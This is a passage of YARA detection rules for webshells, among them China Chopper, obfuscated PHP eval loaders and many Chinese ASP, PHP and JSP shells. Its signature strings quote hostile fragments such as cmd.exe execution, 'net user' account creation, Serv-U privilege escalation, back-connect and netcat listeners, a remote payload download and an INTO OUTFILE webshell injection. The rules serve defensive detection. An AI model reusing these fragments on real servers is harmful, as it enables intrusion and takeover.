	$s2 = "String sql = request.getParameter(\"sqlcmd\");" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 35KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_Injection_Transit_jmPost
{
strings:
	$s1 = "response.write  PostData(JMUrl,JmStr,JmCok,JmRef)" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "JmdcwName=request(\"jmdcw\")" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 9KB and all of them
}
rule Asp_Webshell_CN_Honker_Webshell_ASP_web_asp
{
strings:
	$s0 = "<FORM method=post target=_blank>ShellUrl: <INPUT " fullword ascii /* PEStudio Blacklist: strings */
	$s1 = "\" >[Copy code]</a> 4ngr7&nbsp; &nbsp;</td>" fullword ascii
condition:
	filesize < 13KB and all of them
}
rule Asp_Webshell_CN_Honker_Webshell_wshell_asp
{
strings:
	$s1 = "file1.Write(\"<%response.clear:execute request(\\\"root\\\"):response.End%>\");" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "hello word !  " fullword ascii /* PEStudio Blacklist: strings */
	$s3 = "root.asp " fullword ascii
condition:
	filesize < 5KB and all of them
}
rule Asp_Webshell_CN_Honker_Webshell_ASP_asp404
{
strings:
	$s0 = "temp1 = Len(folderspec) - Len(server.MapPath(\"./\")) -1" fullword ascii /* PEStudio Blacklist: strings */
	$s1 = "<form name=\"form1\" method=\"post\" action=\"<%= url%>?action=chklogin\">" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "<td>&nbsp;<a href=\"<%=tempurl+f1.name%>\" target=\"_blank\"><%=f1.name%></a></t" ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 113KB and all of them
}
rule Asp_Webshell_CN_Honker_Webshell_Serv_U_asp
{
strings:
	$s1 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" &" ascii /* PEStudio Blacklist: strings */
	$s2 = "<td><input name=\"c\" type=\"text\" id=\"c\" value=\"cmd /c net user goldsun lov" ascii /* PEStudio Blacklist: strings */
	$s3 = "deldomain = \"-DELETEDOMAIN\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \" PortNo=\"" ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 30KB and 2 of them
}
rule Php_Webshell_CN_Honker_Webshell_cfm_list
{
strings:
	$s1 = "<TD><a href=\"javascript:ShowFile('#mydirectory.name#')\">#mydirectory.name#</a>" ascii /* PEStudio Blacklist: strings */
	$s2 = "<TD>#mydirectory.size#</TD>" fullword ascii
condition:
	filesize < 10KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_PHP_php2
{
strings:
	$s1 = "$OOO0O0O00=__FILE__;$OOO000000=urldecode('" ascii /* PEStudio Blacklist: strings */
	$s2 = "<?php // Black" fullword ascii
condition:
	filesize < 12KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_Tuoku_script_oracle
{
strings:
	$s1 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "String user=\"oracle_admin\";" fullword ascii /* PEStudio Blacklist: strings */
	$s3 = "String sql=\"SELECT 1,2,3,4,5,6,7,8,9,10 from user_info\";" fullword ascii
condition:
	filesize < 7KB and all of them
}
rule Asp_Webshell_CN_Honker_Webshell_ASPX_aspx4
{
strings:
	$s4 = "File.Delete(cdir.FullName + \"\\\\test\");" fullword ascii /* PEStudio Blacklist: strings */
	$s5 = "start<asp:TextBox ID=\"Fport_TextBox\" runat=\"server\" Text=\"c:\\\" Width=\"60" ascii /* PEStudio Blacklist: strings */
	$s6 = "<div>Code By <a href =\"http://www.hkmjj.com\">Www.hkmjj.Com</a></div>" fullword ascii
condition:
	filesize < 11KB and all of them
}
rule Asp_Webshell_CN_Honker_Webshell_ASPX_aspx
{
strings:
	$s0 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin" ascii /* PEStudio Blacklist: strings */
	$s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii /* PEStudio Blacklist: strings */
	$s2 = "td.Text=\"<a href=\\\"javascript:Bin_PostBack('urJG','\"+dt.Rows[j][\"ProcessID" ascii /* PEStudio Blacklist: strings */
	$s3 = "vyX.Text+=\"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\"+MVVJ(rootkey)+" ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 353KB and 2 of them
}
rule Php_Webshell_CN_Honker_Webshell_su7_x_9_x
{
strings:
	$s0 = "returns=httpopen(\"LoginID=\"&user&\"&FullName=&Password=\"&pass&\"&ComboPasswor" ascii /* PEStudio Blacklist: strings */
	$s1 = "returns=httpopen(\"\",\"POST\",\"http://127.0.0.1:\"&port&\"/Admin/XML/User.xml?" ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 59KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_cfmShell
{
strings:
	$s0 = "<cfexecute name=\"C:\\Winnt\\System32\\cmd.exe\"" fullword ascii /* PEStudio Blacklist: strings */
	$s4 = "<cfif FileExists(\"#GetTempDirectory()#foobar.txt\") is \"Yes\">" fullword ascii
condition:
	filesize < 4KB and all of them
}
rule Asp_Webshell_CN_Honker_Webshell_ASP_asp4
{
strings:
	$s2 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii /* PEStudio Blacklist: strings */
	$s6 = "Response.Cookies(Cookie_Login) = sPwd" fullword ascii /* PEStudio Blacklist: strings */
	$s8 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 150KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_Serv_U_2_admin_by_lake2
{
strings:
	$s1 = "xPost3.Open \"POST\", \"http://127.0.0.1:\"& port &\"/lake2\", True" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "response.write \"FTP user lake  pass admin123 :)<br><BR>\"" fullword ascii /* PEStudio Blacklist: strings */
	$s8 = "<p>Serv-U Local Get SYSTEM Shell with ASP" fullword ascii /* PEStudio Blacklist: strings */
	$s9 = "\"-HomeDir=c:\\\\\" & vbcrlf & \"-LoginMesFile=\" & vbcrlf & \"-Disable=0\" & vb" ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 17KB and 2 of them
}
rule Php_Webshell_CN_Honker_Webshell_PHP_php3
{
strings:
	$s1 = "} elseif(@is_resource($f = @popen($cfe,\"r\"))) {" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "cf('/tmp/.bc',$back_connect);" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 8KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_Serv_U_by_Goldsun
{
strings:
	$s1 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/goldsun/upadmin/s2\", True," ascii /* PEStudio Blacklist: strings */
	$s2 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" &" ascii /* PEStudio Blacklist: strings */
	$s3 = "127.0.0.1:<%=port%>," fullword ascii /* PEStudio Blacklist: strings */
	$s4 = "GName=\"http://\" & request.servervariables(\"server_name\")&\":\"&request.serve" ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 30KB and 2 of them
}
rule Php_Webshell_CN_Honker_Webshell_PHP_php10
{
strings:
	$s1 = "dumpTable($N,$M,$Hc=false){if($_POST[\"format\"]!=\"sql\"){echo\"\\xef\\xbb\\xbf" ascii /* PEStudio Blacklist: strings */
	$s2 = "';if(DB==\"\"||!$od){echo\"<a href='\".h(ME).\"sql='\".bold(isset($_GET[\"sql\"]" ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 600KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_Serv_U_servu
{
strings:
	$s0 = "fputs ($conn_id, \"SITE EXEC \".$dir.\"cmd.exe /c \".$cmd.\"\\r\\n\");" fullword ascii /* PEStudio Blacklist: strings */
	$s1 = "function ftpcmd($ftpport,$user,$password,$dir,$cmd){" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 41KB and all of them
}
rule Jsp_Webshell_CN_Honker_Webshell_portRecall_jsp2
{
strings:
	$s0 = "final String remoteIP =request.getParameter(\"remoteIP\");" fullword ascii /* PEStudio Blacklist: strings */
	$s4 = "final String localIP = request.getParameter(\"localIP\");" fullword ascii /* PEStudio Blacklist: strings */
	$s20 = "final String localPort = \"3390\";//request.getParameter(\"localPort\");" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 23KB and all of them
}
rule Asp_Webshell_CN_Honker_Webshell_ASPX_aspx2
{
strings:
	$s0 = "if (password.Equals(this.txtPass.Text))" fullword ascii /* PEStudio Blacklist: strings */
	$s1 = "<head runat=\"server\">" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = ":<asp:TextBox runat=\"server\" ID=\"txtPass\" Width=\"400px\"></asp:TextBox>" fullword ascii /* PEStudio Blacklist: strings */
	$s3 = "this.lblthispath.Text = Server.MapPath(Request.ServerVariables[\"PATH_INFO\"]);" fullword ascii /* PEStudio Blacklist: strings */
condition:
	uint16(0) == 0x253c and filesize < 9KB and all of them
}
rule Asp_Webshell_CN_Honker_Webshell_ASP_hy2006a
{
strings:
	$s15 = "Const myCmdDotExeFile = \"command.com\"" fullword ascii /* PEStudio Blacklist: strings */
	$s16 = "If LCase(appName) = \"cmd.exe\" And appArgs <> \"\" Then" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 406KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_PHP_php1
{
strings:
	$s7 = "$sendbuf = \"site exec \".$_POST[\"SUCommand\"].\"\\r\\n\";" fullword ascii /* PEStudio Blacklist: strings */
	$s8 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_c" ascii /* PEStudio Blacklist: strings */
	$s18 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport" ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 621KB and all of them
}
rule Jsp_Webshell_CN_Honker_Webshell_jspshell2
{
strings:
	$s10 = "if (cmd == null) cmd = \"cmd.exe /c set\";" fullword ascii /* PEStudio Blacklist: strings */
	$s11 = "if (program == null) program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt" ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 424KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_PHP_php9
{
strings:
	$s1 = "Str[17] = \"select shell('c:\\windows\\system32\\cmd.exe /c net user b4che10r ab" ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 1087KB and all of them
}
rule Jsp_Webshell_CN_Honker_Webshell_portRecall_jsp
{
strings:
	$s0 = "lcx.jsp?localIP=202.91.246.59&localPort=88&remoteIP=218.232.111.187&remotePort=2" ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 1KB and all of them
}
rule Asp_Webshell_CN_Honker_Webshell_ASPX_aspx3
{
strings:
	$s0 = "Process p1 = Process.Start(\"\\\"\" + txtRarPath.Value + \"\\\"\", \" a -y -k -m" ascii /* PEStudio Blacklist: strings */
	$s12 = "if (_Debug) System.Console.WriteLine(\"\\ninserting filename into CDS:" ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 100KB and all of them
}
rule Asp_Webshell_CN_Honker_Webshell_ASPX_shell_shell
{
strings:
	$s0 = "<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cook" ascii /* PEStudio Blacklist: strings */
	$s1 = "<%@ Page Language=\"C#\" ValidateRequest=\"false\" %>" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 1KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell__php1_php7_php9
{
strings:
	$s1 = "<a href=\"?s=h&o=wscript\">[WScript.shell]</a> " fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "document.getElementById('cmd').value = Str[i];" fullword ascii
	$s3 = "Str[7] = \"copy c:\\\\\\\\1.php d:\\\\\\\\2.php\";" fullword ascii
condition:
	filesize < 300KB and all of them
}
rule Asp_Webshell_CN_Honker_Webshell__Serv_U_by_Goldsun_asp3_Serv_U_asp
{
strings:
	$s1 = "c.send loginuser & loginpass & mt & deldomain & quit" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "loginpass = \"Pass \" & pass & vbCrLf" fullword ascii /* PEStudio Blacklist: strings */
	$s3 = "b.send \"User go\" & vbCrLf & \"pass od\" & vbCrLf & \"site exec \" & cmd & vbCr" ascii
condition:
	filesize < 444KB and all of them
}
rule Asp_Webshell_CN_Honker_Webshell__asp4_asp4_MSSQL__MSSQL_
{
strings:
	$s0 = "\"<form name=\"\"searchfileform\"\" action=\"\"?action=searchfile\"\" method=\"" ascii /* PEStudio Blacklist: strings */
	$s1 = "\"<TD ALIGN=\"\"Left\"\" colspan=\"\"5\"\">[\"& DbName & \"]" fullword ascii
	$s2 = "Set Conn = Nothing " fullword ascii
condition:
	filesize < 341KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell__Injection_jmCook_jmPost_ManualInjection
{
strings:
	$s1 = "response.write  PostData(JMUrl,JmStr,JmCok,JmRef)" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "strReturn=Replace(strReturn,chr(43),\"%2B\")  'JMDCW" fullword ascii
condition:
	filesize < 7342KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_cmfshell
{
strings:
	$s1 = "<cfexecute name=\"C:\\Winnt\\System32\\cmd.exe\"" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "<form action=\"<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>\" method=\"post\">" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 4KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_PHP_php4
{
strings:
	$s0 = "nc -l -vv -p port(" fullword ascii /* PEStudio Blacklist: strings */
condition:
	uint16(0) == 0x4850 and filesize < 1KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_Linux_2_6_Exploit
{
strings:
	$s0 = "[+] Failed to get root :( Something's wrong.  Maybe the kernel isn't vulnerable?" fullword ascii
condition:
	filesize < 56KB and all of them
}
rule Asp_Webshell_CN_Honker_Webshell_ASP_asp2
{
strings:
	$s1 = "<%=server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "webshell</font> <font color=#00FF00>" fullword ascii /* PEStudio Blacklist: strings */
	$s3 = "Userpwd = \"admin\"   'User Password" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 10KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_FTP_MYSQL_MSSQL_SSH
{
strings:
	$s1 = "$_SESSION['hostlist'] = $hostlist = $_POST['hostlist'];" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "Codz by <a href=\"http://www.sablog.net/blog\">4ngel</a><br />" fullword ascii
	$s3 = "if ($conn_id = @ftp_connect($host, $ftpport)) {" fullword ascii /* PEStudio Blacklist: strings */
	$s4 = "$_SESSION['sshport'] = $mssqlport = $_POST['sshport'];" fullword ascii /* PEStudio Blacklist: strings */
	$s5 = "<title>ScanPass(FTP/MYSQL/MSSQL/SSH) by 4ngel</title>" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 20KB and 3 of them
}
rule Asp_Webshell_CN_Honker_Webshell_ASP_shell
{
strings:
	$s1 = "xPost.Open \"GET\",\"http://www.i0day.com/1.txt\",False //" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "sGet.SaveToFile Server.MapPath(\"test.asp\"),2 //" fullword ascii /* PEStudio Blacklist: strings */
	$s3 = "http://hi.baidu.com/xahacker/fuck.txt" fullword ascii
condition:
	filesize < 1KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_PHP_php7
{
strings:
	$s0 = "---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; }" ascii /* PEStudio Blacklist: strings */
	$s1 = "$getfile = isset($_POST['downfile']) ? $_POST['downfile'] : ''; $getaction = iss" ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 300KB and all of them
}
rule Asp_Webshell_CN_Honker_Webshell_ASP_rootkit
{
strings:
	$s0 = "set ss=zsckm.get(\"Win32_ProcessSta\"&uyy&\"rtup\")" fullword ascii /* PEStudio Blacklist: strings */
	$s1 = "If jzgm=\"\"Then jzgm=\"cmd.exe /c net user\"" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 80KB and all of them
}
rule Jsp_Webshell_CN_Honker_Webshell_jspshell
{
strings:
	$s1 = "else if(Z.equals(\"M\")){String[] c={z1.substring(2),z1.substring(0,2),z2};Proce" ascii /* PEStudio Blacklist: strings */
	$s2 = "String Z=EC(request.getParameter(Pwd)+\"\",cs);String z1=EC(request.getParameter" ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 30KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_Serv_U_serv_u
{
strings:
	$s1 = "@readfile(\"c:\\\\winnt\\\\system32\\" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "$sendbuf = \"PASS \".$_POST[\"password\"].\"\\r\\n\";" fullword ascii /* PEStudio Blacklist: strings */
	$s3 = "$cmd=\"cmd /c rundll32.exe $path,install $openPort $activeStr\";" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 435KB and all of them
}
rule Php_Webshell_CN_Honker_Webshell_WebShell
{
strings:
	$s1 = "$login = crypt($WebShell::Configuration::password, $salt);" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "my $error = \"This command is not available in the restricted mode.\\n\";" fullword ascii /* PEStudio Blacklist: strings */
	$s3 = "warn \"command: '$command'\\n\";" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 30KB and 2 of them
}
rule Php_Webshell_CN_Honker_Webshell_Tuoku_script_mssql_2
{
strings:
	$s1 = "sqlpass=request(\"sqlpass\")" fullword ascii /* PEStudio Blacklist: strings */
	$s2 = "set file=fso.createtextfile(server.mappath(request(\"filename\")),8,true)" fullword ascii /* PEStudio Blacklist: strings */
	$s3 = "<blockquote> ServerIP:&nbsp;&nbsp;&nbsp;" fullword ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 3KB and all of them
}
rule Asp_Webshell_CN_Honker_Webshell_ASP_asp1
{
strings:
	$s1 = "SItEuRl=" ascii
	$s2 = "<%@ LANGUAGE = VBScript.Encode %><%" fullword ascii /* PEStudio Blacklist: strings */
	$s3 = "Server.ScriptTimeout=" ascii /* PEStudio Blacklist: strings */
condition:
	filesize < 200KB and all of them
}
rule Php_Webshell_webshell_php_gzinflated
{
strings:
	$payload2 = /eval\s?\(\s?("\?>".)?gzinflate\s?\(\s?base64_decode\s?\(/  ascii nocase
	$payload4 = /eval\s?\(\s?("\?>".)?gzuncompress\s?\(\s?(base64_decode|gzuncompress)/  ascii nocase
	$payload6 = /eval\s?\(\s?("\?>".)?gzdecode\s?\(\s?base64_decode\s?\(/  ascii nocase
	$payload7 = /eval\s?\(\s?base64_decode\s?\(/  ascii nocase
	$payload8 = /eval\s?\(\s?pack\s?\(/  ascii nocase
	$fp1 = "YXBpLnRlbGVncmFtLm9"
	$gfp1 = "eval(\"return [$serialised_parameter" // elgg
	$gfp2 = "$this->assert(strpos($styles, $"
	$gfp3 = "$module = new $_GET['module']($_GET['scope']);"
	$gfp4 = "$plugin->$_POST['action']($_POST['id']);"
	$gfp5 = "$_POST[partition_by]($_POST["
	$gfp6 = "$object = new $_REQUEST['type']($_REQUEST['id']);"
	$gfp7 = "The above example code can be easily exploited by passing in a string such as" // ... ;)
	$gfp8 = "Smarty_Internal_Debug::start_render($_template);"
	$gfp9 = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
	$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
	$gfp11 = "(eval (getenv \"EPROLOG\")))"
	$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
	$php_short = "<?" wide ascii
	$no_xml1 = "<?xml version" nocase wide ascii
	$no_xml2 = "<?xml-stylesheet" nocase wide ascii
	$no_asp1 = "<%@LANGUAGE" nocase wide ascii
	$no_asp2 = /<script language="(vb|jscript|c#)/ nocase ascii
	$no_pdf = "<?xpacket"
	$php_new1 = /<\?=[^?]/ ascii
	$php_new2 = "<?php" nocase wide ascii
	$php_new3 = "<script language=\"php" nocase wide ascii
condition:
	filesize < 700KB and not ( any of ( $gfp* ) ) and ( ( ( $php_short in (0..100) or $php_short in (filesize-1000..filesize) ) and not any of ( $no_* ) ) or any of ( $php_new* ) ) and 1 of ( $payload* ) and not any of ( $fp* )
}
rule Php_Webshell_webshell_php_obfuscated_encoding1
{
strings:
	$ob1 = /(chr\([\d]+\)\.){2}/ ascii nocase
	$ob2 = "gzinflate(base64_decode"
	$php_short = "<?" wide ascii
	$no_xml1 = "<?xml version" nocase wide ascii
	$no_xml2 = "<?xml-stylesheet" nocase wide ascii
	$no_asp1 = "<%@LANGUAGE" nocase wide ascii
	$no_asp2 = /<script language="(vb|jscript|c#)/ nocase ascii
	$no_pdf = "<?xpacket"
	$php_new1 = /<\?=[^?]/ ascii
	$php_new2 = "<?php" nocase wide ascii
	$php_new3 = "<script language=\"php" nocase wide ascii
condition:
	filesize < 700KB and ( ( ( $php_short in (0..100) or $php_short in (filesize-1000..filesize) ) and not any of ( $no_* ) ) or any of ( $php_new* ) ) and any of ( $ob* )
}
rule Asp_Webshell_webshell_ChinaChopper_aspx
{
strings:
	$ChinaChopperASPX = {25 40 20 50 61 67 65 20 4C 61 6E 67 75 61 67 65 3D ?? 4A 73 63 72 69 70 74 ?? 25 3E 3C 25 65 76 61 6C 28 52 65 71 75 65 73 74 2E 49 74 65 6D 5B [1-100] 75 6E 73 61 66 65}
condition:
	$ChinaChopperASPX
}
rule Php_Webshell_webshell_ChinaChopper_php
{
strings:
	$ChinaChopperPHP = {3C 3F 70 68 70 20 40 65 76 61 6C 28 24 5F 50 4F 53 54 5B ?? 70 61 73 73 77 6F 72 64 ?? 5D 29 3B 3F 3E}
condition:
	$ChinaChopperPHP
}
rule Php_Webshell_webshell_php_strings_susp
{
strings:
	$sstring1 = "eval(\"?>\"" nocase wide ascii
	$php_short = "<?" wide ascii
	$no_xml1 = "<?xml version" nocase wide ascii
	$no_xml2 = "<?xml-stylesheet" nocase wide ascii
	$no_asp1 = "<%@LANGUAGE" nocase wide ascii
	$no_asp2 = /<script language="(vb|jscript|c#)/ nocase ascii
	$no_pdf = "<?xpacket"
	$php_new1 = /<\?=[^?]/  ascii
	$php_new2 = "<?php" nocase wide ascii
	$php_new3 = "<script language=\"php" nocase wide ascii
	$gfp1 = "eval(\"return [$serialised_parameter" // elgg
	$gfp2 = "$this->assert(strpos($styles, $"
	$gfp3 = "$module = new $_GET['module']($_GET['scope']);"
	$gfp4 = "$plugin->$_POST['action']($_POST['id']);"
	$gfp5 = "$_POST[partition_by]($_POST["
	$gfp6 = "$object = new $_REQUEST['type']($_REQUEST['id']);"
	$gfp7 = "The above example code can be easily exploited by passing in a string such as" // ... ;)
	$gfp8 = "Smarty_Internal_Debug::start_render($_template);"
	$gfp9 = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
	$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
	$gfp11 = "(eval (getenv \"EPROLOG\")))"
	$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
	$inp1 = "php://input" wide ascii
	$inp2 = /_GET\s?\[/  ascii
	$inp3 = /\(\s?\$_GET\s?\)/  ascii
	$inp4 = /_POST\s?\[/  ascii
	$inp5 = /\(\s?\$_POST\s?\)/  ascii
	$inp6 = /_REQUEST\s?\[/  ascii
	$inp7 = /\(\s?\$_REQUEST\s?\)/  ascii
	$inp15 = "_SERVER['HTTP_" wide ascii
	$inp16 = "_SERVER[\"HTTP_" wide ascii
	$inp17 = /getenv[\t ]{0,20}\([\t ]{0,20}['"]HTTP_/ ascii
	$inp18 = "array_values($_SERVER)" wide ascii
	$inp19 = /file_get_contents\("https?:\/\// ascii
condition:
	filesize < 700KB and ( ( ( $php_short in (0..100) or $php_short in (filesize-1000..filesize) ) and not any of ( $no_* ) ) or any of ( $php_new* ) ) and not ( any of ( $gfp* ) ) and ( 2 of ( $sstring* ) or ( 1 of ( $sstring* ) and ( any of ( $inp* ) ) ) )
}
rule Php_Webshell_webshell_php_dynamic_big
{
strings:
	$dex = { 64 65 ( 78 | 79 ) 0a 30 }
	$pack = { 50 41 43 4b 00 00 00 02 00 }
	$new_php2 = "<?php" nocase wide ascii
	$new_php3 = "<script language=\"php" nocase wide ascii
	$php_short = "<?"
	$dynamic1 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(\$/  ascii
	$dynamic2 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\("/  ascii
	$dynamic3 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\('/  ascii
	$dynamic4 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(str/  ascii
	$dynamic5 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(\)/  ascii
	$dynamic6 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(@/  ascii
	$dynamic7 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(base64_decode/  ascii
	$gen_bit_sus1 = /:\s{0,20}eval}/ nocase  ascii
	$gen_bit_sus2 = /\.replace\(\/\w\/g/ nocase  ascii
	$gen_bit_sus6 = "self.delete"
	$gen_bit_sus9 = "\"cmd /c" nocase
	$gen_bit_sus10 = "\"cmd\"" nocase
	$gen_bit_sus11 = "\"cmd.exe" nocase
	$gen_bit_sus12 = "%comspec%" wide ascii
	$gen_bit_sus13 = "%COMSPEC%" wide ascii
	$gen_bit_sus18 = "Hklm.GetValueNames();" nocase
	$gen_bit_sus19 = "http://schemas.microsoft.com/exchange/" wide ascii
	$gen_bit_sus21 = "\"upload\"" wide ascii
	$gen_bit_sus22 = "\"Upload\"" wide ascii
	$gen_bit_sus23 = "UPLOAD" fullword wide ascii
	$gen_bit_sus24 = "fileupload" wide ascii
	$gen_bit_sus25 = "file_upload" wide ascii
	$gen_bit_sus29 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" fullword wide ascii
	$gen_bit_sus30 = "serv-u" wide ascii
	$gen_bit_sus31 = "Serv-u" wide ascii
	$gen_bit_sus32 = "Army" fullword wide ascii
	$gen_bit_sus33 = /\$_(GET|POST|REQUEST)\["\w"\]/ fullword  ascii
	$gen_bit_sus55 = /\w'\.'\w/  ascii
	$gen_bit_sus56 = /\w\"\.\"\w/  ascii
	$gen_bit_sus73 = /(\.htpasswd|hacking|Hacking|"\?>"\.|\$cmd|\$password="|\$password='|whoami|portscan|Cyber|\/bin\/sh|"execute"|'cmd'|dumper|\.ssh\/authorized_keys| \^ \$|suhosin|bypass|Shell|shell_|<PRE>|<pre>|crack|Content-Transfer-Encoding: Binary)/ ascii
	$gen_bit_sus74 = /\btouch\(\$[^,]{1,30},/  ascii
	$gen_much_sus37 = /(rootkit|Rootkit|grayhat|hacker|hacked|HACKED|Hacker|TVqQAAMAAA|Exploit|exploit|'unsafe|"unsafe|nishang|McAfee|antivirus|pcAnywhere|WScript\.Shell\.1|hidded shell|WebShell|Web Shell)/ ascii
	$gen_much_sus38 = /(eval\(eval\(|\("\/\*\/"|\/\*\/\/\*\/|"u"\+"e|q"\+"u"|"\+"\("\+"|a"\+"l"|"e"\+"v|u"\+"n"\+"s|\/\*-\/\*-\*\/)/ ascii
	$gen_much_sus48 = /(-name config\.inc\.php|grep -li password|-perm -02000|-perm -04000|_\.=\$_|\+\+;\$|\+\+; \$|_=\$\$_|-Expire=0|PasswordType=Regular|Shell\.Users|unlink\(__FILE__\))/  ascii
	$gen_much_sus75 = /(password crack|mysqlDll\.dll|net user|suhosin\.executor\.disable_|disabled_suhosin|fopen\("\.htaccess","w|strrev\(['"]|PHPShell|PHP Shell|phpshell|PHPshell|deface|Deface|backdoor|r00t|xp_cmdshell)/ ascii
	$gif = { 47 49 46 38 }
condition:
	filesize < 500KB and not ( uint16(0) == 0x5a4d or $dex at 0 or $pack at 0 or uint16(0) == 0x4b50 ) and ( any of ( $new_php* ) or $php_short at 0 ) and ( any of ( $dynamic* ) ) and ( $gif at 0 or ( filesize < 4KB and ( 1 of ( $gen_much_sus* ) or 2 of ( $gen_bit_sus* ) ) ) or ( filesize < 20KB and ( 2 of ( $gen_much_sus* ) or 3 of ( $gen_bit_sus* ) ) ) or ( filesize < 500KB and ( 2 of ( $gen_much_sus* ) or 4 of ( $gen_bit_sus* ) ) ) )
}
rule Php_Webshell_webshell_php_generic_callback
{
strings:
	$gfp1 = "eval(\"return [$serialised_parameter" // elgg
	$gfp2 = "$this->assert(strpos($styles, $"
